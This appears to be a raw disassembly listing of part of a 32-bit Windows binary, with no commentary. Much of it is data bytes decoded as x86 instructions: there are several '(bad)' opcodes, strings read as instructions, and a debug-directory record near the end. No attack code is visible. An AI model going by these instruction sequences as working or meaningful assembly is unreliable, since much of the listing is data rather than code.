  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	jmp    0x42aaf8
  42ab5a:	dec    ecx
  42ab5b:	xchg   ebx,eax
  42ab5c:	addr16 clc 
  42ab5e:	push   ds
  42ab5f:	inc    esi
  42ab60:	test   eax,0x960068ea
  42ab65:	xchg   ebx,eax
  42ab66:	mov    ah,0xf9
  42ab68:	sbb    al,0x0
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
